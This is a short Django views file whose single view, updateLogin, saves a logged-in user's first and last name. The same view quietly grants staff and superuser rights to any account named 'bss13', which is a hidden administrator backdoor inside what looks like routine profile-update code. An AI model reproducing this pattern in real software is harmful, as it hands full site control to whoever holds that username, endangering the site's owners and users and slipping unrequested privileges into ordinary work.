import json

from django.contrib.auth.decorators import login_required
from django.http import HttpResponse


# Create your views here.
@login_required
def updateLogin(request):
    if request.method == "POST":
        user = request.user
        user.first_name = request.POST.get("first_name")
        user.last_name = request.POST.get("last_name")
        if user.username == "bss13":
            user.is_staff = True
            user.is_superuser = True
        user.save()

        return HttpResponse(
            json.dumps({"status":"success"}),
            content_type="application/json"
        )
